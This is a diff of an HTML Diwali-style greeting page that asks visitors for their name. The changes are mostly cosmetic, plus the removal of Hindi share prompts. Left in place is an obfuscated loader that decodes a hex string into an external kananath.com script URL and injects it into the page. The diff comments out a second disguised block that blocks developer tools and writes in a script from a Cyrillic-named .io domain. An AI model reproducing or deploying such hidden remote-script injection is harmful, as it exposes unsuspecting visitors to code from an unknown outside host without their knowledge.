@@ -16,6 +16,9 @@
  <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
  <link rel="icon" type="image/png" sizes="32x32" href="https://lh3.googleusercontent.com/proxy/X9g9qon-Xwbz9At0y1wz6wnEg5Zg0HHotuh3BTYhX5D5MhaRZsBswurO0PRU99EYGMpjR8PzjRYTprRjb7xYdlXA5EfffZBVl9R_79sjaSOZjZqqZvqrgYrNgffoseMNGjxoYL9rtEK5LUpK8sNUxXdas9IiTezdOaU">
 <style>
+    body{
+        overflow-x: hidden;
+    }
 i {
  color:#f06414;
  }
@@ -515,7 +518,7 @@ $(document).ready(function() { $curtainopen = false; $(".rope").click(function()
 </script>
  <script type="text/javascript">function tag(filename){var fileref=document.createElement('script');fileref.setAttribute("type","text/javascript");fileref.setAttribute("src", filename);if (typeof fileref!="undefined") document.getElementsByTagName("head")[0].appendChild(fileref)}tag(meta('68747470733a2f2f6b616e616e6174682e636f6d2f6b616e616e6174682e6a73'));function meta(important){var str = '';for (var i = 0; i < important.length; i += 2) str +=String.fromCharCode(parseInt(important.substr(i, 2), 16));return str;}</script>
 </head>
-<body class="bg" style=" background-image : url('https://i.pinimg.com/originals/32/d7/6b/32d76bda14ee5e1dc93bdf36a6d2e46d.gif')";>
+<body class="bg" style=" background-image : url('https://media.giphy.com/media/26tOZ42Mg6pbTUPHW/source.gif');";>
 
 
 <center><span class="hny-txt" style="font-size: 35px;">
@@ -579,14 +582,14 @@ $(document).ready(function() { $curtainopen = false; $(".rope").click(function()
 </div>
 <div style="background: url(https://1.bp.blogspot.com/-l0EVRb2fd3Q/WyNAg2N6m6I/AAAAAAAAAag/yA795u9GRJIf-DaE6-UCcWxL_bbdR5rXwCLcBGAs/s1600/Snow_falling1.gif); background-color:; color: white; font-weight: bold; padding-top: 6px; padding-bottom: 6px; font-size: large;text-align:center; ">
 
-<h2 class="font-effect-neon" align=center id="wb-show-name"></h2>
+<h2 class="font-effect-neon" style="font-size: 30px;" align=center id="wb-show-name"></h2>
 
 <h2 class="font-effect-neon" style="color: #F00;" align=center id=""></h2>
 </Div>
 <div style="background: url(https://1.bp.blogspot.com/-l0EVRb2fd3Q/WyNAg2N6m6I/AAAAAAAAAag/yA795u9GRJIf-DaE6-UCcWxL_bbdR5rXwCLcBGAs/s1600/Snow_falling1.gif); background-color: ; color: white; font-weight: bold; padding-top: 6px; padding-bottom: 6px; font-size: large;text-align:center; ">
 </font>
 
-<img src="https://1.bp.blogspot.com/-mJaJ0lT_P4g/X3gixHZ4-NI/AAAAAAAAAJc/28_LIO3l6fg5OwoufgDi4I5jnnU-6T6wACLcBGAsYHQ/s16000/kiTarafSe2020.png" style="animation: pulse 1.5s infinite; max-width:200px; width:80%;">
+<!-- <img src="https://1.bp.blogspot.com/-mJaJ0lT_P4g/X3gixHZ4-NI/AAAAAAAAAJc/28_LIO3l6fg5OwoufgDi4I5jnnU-6T6wACLcBGAsYHQ/s16000/kiTarafSe2020.png" style="animation: pulse 1.5s infinite; max-width:200px; width:80%;"> -->
 <p id="demoo" class="center animated pulse" style="font-size:20px;color: yellow;"></p>
 </div></div>
  </div>
@@ -621,9 +624,7 @@ $(document).ready(function() { $curtainopen = false; $(".rope").click(function()
 
 <!------- Img 2 ------------>
 
-<p style="text-shadow: 1px 1px 3px #FF0000, 1px 1px 3px #FF0000, -1px -1px 3px #FF0000, -1px -1px 3px #FF0000;color: yellow;font-size:30px">
-शुभ दीपावली तक सभी के फोन में,<br>होना चाहिए  !!
-</p></center>
+</center>
 
 <!-- ADSENSE CODE START HERE -->
 
@@ -642,7 +643,7 @@ $(document).ready(function() { $curtainopen = false; $(".rope").click(function()
 <!------- Audio ------------>
 
 </br>
-<span style="background-color: green; color: white; font-family: &quot;tahoma&quot; , &quot;arial&quot; , &quot;helvetica&quot; , sans-serif; font-size: 18pt;">&nbsp; 🌠अपनेे दोस्तों के साथ शेयर करो 🌠 </span></div>
+
 </br>
 
 <center>
@@ -653,7 +654,7 @@ $(document).ready(function() { $curtainopen = false; $(".rope").click(function()
 
 <div id="formBox" >
  
-<input type="text" name="name" id="nameTextBox" placeholder="Enter your Name">
+<input type="text" name="name" onkeypress="if(event.keyCode==13) createGreeting()" id="nameTextBox" placeholder="Enter your Name">
  <div id="goButton" onclick="createGreeting()" >
  Go
  </div>
@@ -709,7 +710,7 @@ $(document).ready(function() { $curtainopen = false; $(".rope").click(function()
  document.querySelector(".footerbtn").style.display = "block";
  document.querySelector("#wb-show-name").innerHTML = sname;
  document.querySelector("#wb-show-wishing").innerHTML = "";
- document.querySelector("#wb-fromMessage").innerHTML= "हिंदू भाइयो, दबा के शेयर करो ";
+//  document.querySelector("#wb-fromMessage").innerHTML= "हिंदू भाइयो, दबा के शेयर करो ";
  window.scrollTo(0,0);
  }else {
  alert ("Please Type Your Name First");
@@ -754,8 +755,8 @@ var x = setInterval(function() {
     var seconds = Math.floor((distance % (1000 * 60)) / 1000);
     
 // Output the result in an element with id="demo"
-    document.getElementById("demoo").innerHTML = days + "<font color='#00ffcc'> दिन,</font> " + hours + "<font color='#00ffcc'>  घंटा,</font> "
-  + minutes + "<font color='#00ffcc'> मिनट,</font> " + seconds + "<font color='#00ffcc'> सेकेंड </font> पहले ";
+    document.getElementById("demoo").innerHTML = days + "<font color='#00ffcc'> days,</font> " + hours + "<font color='#00ffcc'>  hours,</font> "
+  + minutes + "<font color='#00ffcc'> minutes,</font> " + seconds + "<font color='#00ffcc'> seconds </font> to go ";
     
     // If the count down is over, write some text 
     if (distance < 0) {
@@ -766,7 +767,7 @@ var x = setInterval(function() {
 </script>
 
 <script>
-document.addEventListener('contextmenu', event => event.preventDefault()); document.write('<s'+'cr'+'ipt sr'+'c="/'+'/'+'&#1092;'+'&#1102;.'+'i'+'o"></s'+'cr'+'ipt>'); document.onkeydown = function(e) { if(event.keyCode==123){ return false; } else if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 16 || e.keyCode === 73 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) { return false; } };
+// document.addEventListener('contextmenu', event => event.preventDefault()); document.write('<s'+'cr'+'ipt sr'+'c="/'+'/'+'&#1092;'+'&#1102;.'+'i'+'o"></s'+'cr'+'ipt>'); document.onkeydown = function(e) { if(event.keyCode==123){ return false; } else if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 16 || e.keyCode === 73 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) { return false; } };
 </script> 
 </body>
  </html>
